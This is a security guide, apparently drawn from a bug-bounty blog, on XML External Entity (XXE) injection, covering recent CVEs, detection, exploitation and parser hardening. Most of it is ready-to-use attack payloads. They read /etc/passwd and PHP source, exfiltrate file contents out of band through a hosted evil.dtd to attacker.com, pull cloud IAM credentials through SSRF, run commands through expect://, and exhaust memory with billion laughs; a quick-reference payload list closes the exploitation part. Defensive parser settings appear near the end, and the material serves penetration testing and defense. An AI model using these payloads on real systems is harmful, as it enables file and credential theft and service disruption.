# The Ultimate Guide to XML External Entity (XXE) Injection

## Summary

{% hint style="info" %}
XML External Entity injection (XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem and to interact with any backend or external systems that the application itself can access.
{% endhint %}

XXE vulnerabilities occur when weakly configured XML parsers evaluate external entities referenced within untrusted XML input. Modern applications often inherit these risks through legacy dependencies, explicit enabling of unsafe features, or third-party components .

### Why This Still Matters (2024-2026 Reality)

XXE remains a critical threat in production environments. Recent high-profile incidents demonstrate its continued relevance:

- **Ivanti Connect Secure (CVE-2024-22024)**: In February 2024, attackers began exploiting an XXE vulnerability in the SAML component of Ivanti's VPN products just days after a patch was released. The flaw allowed unauthenticated attackers to access restricted resources. Security firms observed scanning and payload attempts from over 80 IP addresses targeting more than 30,000 hosts .

- **WSO2 API Manager (CVE-2024-8010)**: A critical XXE vulnerability was discovered in the product's publisher component, allowing malicious actors to read confidential files from the file system or access limited HTTP resources via HTTP GET requests .

- **North Grid Proself (CVE-2023-45727)**: Added to CISA's Known Exploited Vulnerabilities catalog in December 2024, this XXE flaw allows unauthenticated attackers to read server files containing account data .

- **Report Portal (CVE-2021-29620)**: A complex, chained XXE vulnerability requiring authentication bypass and file upload manipulation, demonstrating that even authenticated features can harbor XXE risks .

---

## Detection & Attack Surface Mapping

You cannot find what you do not see. XXE often hides in unexpected places where XML parsers work behind the scenes.

### Where to Look

| Attack Surface | Detection Methodology |
|----------------|----------------------|
| **Content Type Manipulation** | Change `Content-Type` headers from `application/json` or `application/x-www-form-urlencoded` to `application/xml`. Many frameworks automatically switch parsers. |
| **File Uploads** | Upload DOCX, XLSX, PPTX, PDF, or ZIP files. Unzip packages and inject malicious XML into the underlying XML structures. |
| **SVG Images** | Upload malicious SVG files (profile pictures, badges). SVG is XML by design. |
| **RSS Feeds** | Inject payloads into RSS feed generators if the application processes external feeds. |
| **SOAP APIs** | Fuzz for `/soap`, `/api/soap`, or WSDL endpoints. Legacy SOAP services are inherently XML-based. |
| **SAML Integrations** | Inject XXE payloads into SAML requests/responses if the application uses SSO. |
| **Document Converters** | Test endpoints that accept XML for conversion to PDF, HTML, or other formats . |

### Initial Verification Payload

Send this payload to verify if the parser evaluates entities:

```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

If `&test;` is replaced with "THIS IS A STRING!" in the response, the parser evaluates general entities. Proceed to exploitation.

### File Disclosure Verification

```xml
<?xml version="1.0"?>
<!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

**Expected vulnerable response:** The contents of `/etc/passwd` appear in the response.

---

## Real-World Exploitation Scenarios

### Scenario 1: Classic XXE in an E-commerce API

**The Setup:** An e-commerce platform's product import API at `/api/products/import` allows bulk uploads via XML.

**The Attack:**
```http
POST /api/products/import HTTP/1.1
Host: shop.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>999</price>
    <category>Electronics</category>
  </product>
</products>
```

**The Result:** The API response contains the server's `/etc/passwd` file within the product name field .

### Scenario 2: PHP Filter Wrapper for Source Code Extraction

**The Problem:** Direct file inclusion may break XML structure due to special characters (`<`, `>`, `&`).

**The Solution:** Use PHP filters to base64-encode the file before exfiltration .

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<methodCall><methodName>&test;</methodName></methodCall>
```

**Decoding the response:**
```bash
echo "PD9waHAKJGRiX2hvc3QgPSAnbG9jYWxob3N0JzsKJGRiX3VzZXJuYW1lID0gJ2FkbWluJzsKJGRiX3Bhc3N3b3JkID0gJ1N1cGVyU2VjdXJlUGFzcyEnOwokZGJfbmFtZSA9ICdhcHBfZGInOwo/Pgo=" | base64 -d
```

### Scenario 3: Blind XXE with Out-of-Band (OOB) Exfiltration

**The Problem:** The application processes XML but never returns entity values in responses.

**The Setup:** Attacker controls a server at `attacker.com`.

**Step 1: Host a malicious DTD file**
Create `evil.dtd` on your server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Send the blind payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<document>
  <title>Quarterly Report</title>
</document>
```

**Step 3: Monitor your server logs**
```bash
python3 -m http.server 8000
# Or use tcpdump for DNS exfiltration
tcpdump -i eth0 port 53
```

When the parser processes the DTD, it fetches `/etc/hostname` and sends it to `attacker.com/log` .

### Scenario 4: XXE to SSRF - Cloud Metadata Extraction

**The Target:** An application running in AWS, Azure, or GCP.

**The Payload:**
```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<foo>&xxe;</foo>
```

**The Impact:** Direct access to cloud instance metadata, potentially exposing IAM credentials, SSH keys, and user data scripts.

### Scenario 5: XXE via SVG Image Upload

**The Setup:** A blogging platform allows users to upload profile pictures, including SVG format.

**The Malicious SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

When the comment or profile is viewed, the image displays the server's hostname .

### Scenario 6: XXE in DOCX/XLSX Uploads

**The Technique:** Microsoft Office files (DOCX, XLSX, PPTX) are ZIP archives containing XML files.

**Steps:**
1. Create a normal DOCX file
2. Unzip: `unzip document.docx -d docx_extracted`
3. Edit `word/document.xml` to inject XXE payload
4. Repackage: `cd docx_extracted && zip -r ../malicious.docx *`
5. Upload the malicious file

### Scenario 7: XInclude Attacks

**When DOCTYPE is blocked:** Some parsers block `<!DOCTYPE>` declarations but still support XInclude.

**The Payload:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Scenario 8: Billion Laughs - Denial of Service

**The Attack:** Recursive entity expansion consuming memory.

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

---

## Advanced Exploitation Techniques

### Bypassing Character Restrictions with Encoding

When special characters break your payload, use base64 encoding for both retrieval and exfiltration:

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker.com/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

**Remote DTD (`dtd.xml`):**
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
```

### Blind XXE via Parameter Entities

If general entities (`&entity;`) don't trigger callbacks, test parameter entities (`%entity;`):

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://collaborator.oastify.com">
  %xxe;
]>
```

Parameter entities are often processed at parse time before validation, making them effective for OOB testing .

### PHP Expect Wrapper - RCE

**Requirement:** PHP with `expect` module enabled (rare in modern setups).

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

---

## Tools of the Trade

| Tool | Purpose | Installation/Usage |
|------|---------|-------------------|
| **Burp Suite Professional** | Automated scanning, Collaborator for OOB | Built-in active scanner flags XXE issues  |
| **XXEinjector** | Comprehensive XXE exploitation | `ruby XXEinjector.rb --host=attacker.com --file=target.txt` |
| **oxml_xxe** | Office XML XXE exploitation | [https://github.com/BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) |
| **Wapiti** | Web app scanner including XXE detection | `sudo apt install wapiti`  |
| **Interactsh** | OOB interaction capture | Open-source alternative to Burp Collaborator |

### Burp Suite Manual Testing Workflow

1. Identify a request containing XML in Proxy > HTTP history
2. Right-click and select "Send to Repeater"
3. Insert XXE payload with Collaborator subdomain:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://xxxxx.oastify.com"> ]>
   ```
4. Replace an XML value with `&xxe;`
5. Click Send and monitor the Collaborator tab for interactions 

---

## Real-World Case Study: Report Portal CVE-2021-29620

This case demonstrates the complexity of real XXE exploitation requiring multiple steps :

**Step 1: Authentication Bypass**
The attacker first needed to authenticate to Report Portal using default credentials (`default:1q2w3e`).

**Step 2: Attack Surface Discovery**
Using ffuf, the attacker discovered the `/api/v1/api-docs` endpoint revealing the complete API structure.

**Step 3: Endpoint Identification**
The Swagger documentation identified `/v1/{projectName}/launch/import` as an endpoint accepting multipart XML uploads.

**Step 4: Initial Test Failure**
Classic in-band XXE failed - the application didn't return parsed content.

**Step 5: OOB Parameter Entity Test**
The attacker switched to parameter entities, which successfully triggered a DNS callback to their Interactsh server, confirming blind XXE.

**Key Takeaway:** Persistence and methodology matter. The vulnerability wasn't immediately obvious and required testing multiple entity types.

---

## Mitigation Strategies

| Vulnerability Type | Mitigation |
|--------------------|------------|
| **All XXE variants** | Disable external entity processing in XML parsers entirely |
| **File disclosure** | Use allowlists for user input validation; avoid reflecting user-supplied XML |
| **Remote Code Execution** | Disable `expect://` and other dangerous PHP wrappers |
| **Blind XXE OOB** | Restrict outbound HTTP/DNS traffic from web servers; use network segmentation |
| **Legacy systems** | Upgrade XML processing libraries; implement WAF rules for XXE patterns  |

### Parser-Specific Configuration

**Java (DocumentBuilderFactory):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

**Python (lxml):**
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

**PHP (libxml):**
```php
libxml_disable_entity_loader(true);
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

---

## Quick Reference Payloads

```xml
# Basic file read
<!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd">]><a>&b;</a>

# PHP filter (base64)
<!DOCTYPE a [<!ENTITY b SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><a>&b;</a>

# SSRF to cloud metadata
<!DOCTYPE a [<!ENTITY b SYSTEM "http://169.254.169.254/latest/meta-data/">]><a>&b;</a>

# Blind OOB with parameter entity
<!DOCTYPE a [<!ENTITY % b SYSTEM "http://attacker.com/evil.dtd">%b;]><a>test</a>

# XInclude file read
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

# SVG payload
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd">]><svg><text>&b;</text></svg>
```

---

## References & Further Reading

- PortSwigger Web Security Academy: [XXE Vulnerabilities](https://portswigger.net/web-security/xxe)
- CVE-2024-22024 (Ivanti) Analysis
- CVE-2024-8010 (WSO2 API Manager) Details
- OWASP XXE Prevention Cheat Sheet

---
https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities
